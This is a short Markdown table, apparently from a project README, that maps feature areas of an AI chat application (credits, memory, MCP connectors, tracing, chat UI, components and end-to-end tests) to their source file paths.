| Credits | `server/credits/Credits.ts`, `server/settings/Settings.ts`, `server/credits/ExtraCredits.ts`, `web/CreditMeter.vue`, `web/credit-request.ts` |
| Memory | `server/memory.ts`, `server/memory/`, `web/MemoryView.vue` |
| Connectors (MCP) | `server/mcp/`, `server/workflow/connectors.ts`, `server/net/NetGuard.ts`, `web/connectors/`, `web/settings/` |
| Tracing | `server/tracing/`, `server/plugins/tracing.ts`, `deploy/jaeger.*` |
| Chat page | `web/ChatView.vue`, `web/Shell.vue` |
| Components | The [frappe-ui-ai-elements](https://github.com/bwhtech/frappe-ui-ai-elements) package. `web/side-panel/panel.ts` is its file viewer (`provideFileViewer` in `web/Shell.vue`). |
| End-to-end tests, the fake OpenRouter and the test MCP servers | `e2e/`, `playwright.config.ts` |
